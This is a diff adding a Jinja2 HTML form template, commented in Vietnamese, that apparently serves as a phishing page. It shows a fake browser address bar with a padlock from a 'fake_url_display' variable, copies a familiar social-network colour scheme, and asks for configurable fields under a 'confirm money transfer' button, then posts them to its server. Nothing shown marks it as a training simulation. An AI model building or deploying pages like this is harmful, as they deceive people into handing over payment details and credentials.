@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ data.form_title }}</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: #fff; width: 100%; max-width: 400px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 25px; }
+        .header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+        .header h2 { color: #1877f2; margin: 0; font-size: 22px; }
+        .url-bar { background: #e9ecef; padding: 10px; text-align: center; font-family: monospace; border-radius: 5px; margin-bottom: 20px; color: #495057; font-size: 12px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; font-size: 14px; }
+        .form-group input { width: 100%; padding: 12px; border: 1px solid #ccd0d5; border-radius: 6px; box-sizing: border-box; font-size: 15px; background: #f5f6f7; }
+        .form-group input:focus { outline: none; border-color: #1877f2; background: #fff; }
+        .btn-submit { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="url-bar">🔒 {{ data.fake_url_display }}</div>
+        <div class="header">
+            <h2>{{ data.form_title }}</h2>
+        </div>
+        <form method="POST" onsubmit="return validateForm()">
+            {% for field in data.inputs %}
+            <div class="form-group">
+                <label>{{ field.name }}</label>
+                <input type="{{ field.type }}" name="field_{{ loop.index0 }}" id="field_{{ loop.index0 }}" required placeholder="{{ field.name }}">
+                <input type="hidden" id="pattern_{{ loop.index0 }}" value="{{ field.pattern }}">
+                <input type="hidden" id="msg_{{ loop.index0 }}" value="{{ field.msg }}">
+            </div>
+            {% endfor %}
+            <button type="submit" class="btn-submit">XÁC NHẬN CHUYỂN TIỀN</button>
+        </form>
+    </div>
+
+    <script>
+        function validateForm() {
+            let i = 0;
+            // Dùng JS thuần để quét các input thay vì dùng thẻ Jinja2 để tránh lỗi linter trong VS Code
+            while (true) {
+                let fieldInput = document.getElementById("field_" + i);
+                
+                // Nếu không tìm thấy field nữa tức là đã duyệt hết các input
+                if (!fieldInput) break; 
+                
+                let val = fieldInput.value;
+                let patternInput = document.getElementById("pattern_" + i);
+                let msgInput = document.getElementById("msg_" + i);
+                
+                if (patternInput && patternInput.value) {
+                    let pattern = new RegExp(patternInput.value);
+                    if (!pattern.test(val)) {
+                        alert(msgInput.value);
+                        return false; 
+                    }
+                }
+                i++;
+            }
+            return true;
+        }
+    </script>
+</body>
+</html>
